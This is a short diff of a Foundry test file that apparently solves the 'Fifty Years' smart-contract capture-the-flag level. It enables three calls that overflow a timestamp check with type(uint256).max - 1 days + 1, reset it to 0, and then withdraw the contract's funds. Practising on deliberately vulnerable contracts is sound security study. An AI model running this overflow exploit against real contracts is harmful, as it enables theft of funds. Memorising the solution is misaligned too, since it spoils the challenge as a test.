@@ -28,10 +28,9 @@ contract FiftyYearsTest is Test {
         /*
          * Goal:
          */
-        console.log(fiftyYearsChallenge.queue[0]);
-        // fiftyYearsChallenge.upsert{value: 1}(666, type(uint256).max - 1 days + 1);
-        // fiftyYearsChallenge.upsert{value: 1}(666, 0);
-        // fiftyYearsChallenge.withdraw(1);
+        fiftyYearsChallenge.upsert{value: 1}(6666, type(uint256).max - 1 days + 1);
+        fiftyYearsChallenge.upsert{value: 1}(6666, 0);
+        fiftyYearsChallenge.withdraw(1);
 
         /*****************
          *Level Submission*
